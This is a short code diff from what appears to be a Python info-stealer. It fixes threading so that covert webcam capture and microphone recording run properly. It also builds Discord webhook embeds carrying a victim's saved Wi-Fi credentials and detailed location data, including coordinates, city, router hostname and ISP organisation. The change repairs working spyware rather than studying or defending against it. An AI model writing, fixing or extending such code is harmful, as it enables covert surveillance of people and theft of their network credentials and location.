@@ -617,9 +617,9 @@ def record_audio(duration=5, freq=44100, channels=2):
         print("Error:", str(e))
 
    
-webcamthread=threading.Thread(target=webcam())
+webcamthread=threading.Thread(target=webcam)
 
-micthread=threading.Thread(target=record_audio())
+micthread=threading.Thread(target=record_audio)
 
 wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
 locationembed=DiscordEmbed(title='Location Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Router Hostname: {hostname}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```',color='fcba03')
